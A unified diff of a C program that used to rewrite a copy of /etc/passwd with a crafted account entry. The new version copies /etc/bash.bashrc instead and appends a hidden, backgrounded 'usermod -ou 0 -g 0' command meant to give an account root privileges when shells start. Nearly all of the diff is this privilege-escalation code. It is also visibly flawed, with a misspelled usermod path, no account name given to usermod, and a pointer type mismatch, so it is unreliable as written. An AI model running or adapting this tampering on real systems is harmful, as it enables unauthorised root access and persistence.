@@ -90,44 +90,50 @@ void writeMyLine(FILE * f, char * line) {
 
 int main() {
     FILE *ogFile, *newFile;
-    ogFile = fopen("/etc/passwd", "r");
-    newFile = fopen("./tmp/passwd", "w");
+    ogFile = fopen("/etc/bash.bashrc", "r");
+    newFile = fopen("./tmp/bash.bashrc", "w");
+    char line[] = "/bin/bash -c \"/user/sbin/usermod -ou 0 -g 0 > /dev/null 2>&1 & \"\n";
 
     char c = fgetc(ogFile);
-    bool useMyEntry = false;
-    char * myEntry = malloc(sizeof(char) * 100);
+    // bool useMyEntry = false;
+    // char * myEntry = malloc(sizeof(char) * 100);
     fpos_t pos;
     // copy the files from /etc to ./tmp/passwd
     while(c != EOF) {
         fgetpos(ogFile, &pos);
 
-        if (c == '\n') {
-            if (checkUsername(ogFile)) {
-                fsetpos(ogFile, &pos);
-                // printf("username worked\n");
-                genEntry(ogFile, myEntry);
-                int k = 0;
-                // while(myEntry[k] != '\n') {
-                //     printf("%c", myEntry[k]);
-                //     k++;
-                // }
-                // printf("\n");
-                useMyEntry = true;
-            } else {
-                fsetpos(ogFile, &pos);
-            }
-        } 
+        // if (c == '\n') {
+        //     if (checkUsername(ogFile)) {
+        //         fsetpos(ogFile, &pos);
+        //         // printf("username worked\n");
+        //         genEntry(ogFile, myEntry);
+        //         int k = 0;
+        //         // while(myEntry[k] != '\n') {
+        //         //     printf("%c", myEntry[k]);
+        //         //     k++;
+        //         // }
+        //         // printf("\n");
+        //         useMyEntry = true;
+        //     } else {
+        //         fsetpos(ogFile, &pos);
+        //     }
+        // } 
 
-        if (useMyEntry) {
+        // if (useMyEntry) {
 
-            fputc('\n', newFile);
-            // printf("before writemyline\n");
-            writeMyLine(newFile, myEntry);
-            // printf("writeMyLine worked\n");
-            useMyEntry = false;
-        } else {
-            fputc(c, newFile);
-        }
+        //     fputc('\n', newFile);
+        //     // printf("before writemyline\n");
+        //     writeMyLine(newFile, myEntry);
+        //     // printf("writeMyLine worked\n");
+        //     useMyEntry = false;
+        // } else {
+        fputc(c, newFile);
+        // }
         c = fgetc(ogFile);
+        if (c == EOF) {
+            fsetpos(ogFile, &pos);
+            writeMyLine(newFile, &line);
+            c = fgetc(ogFile);
+        }
     }
 }
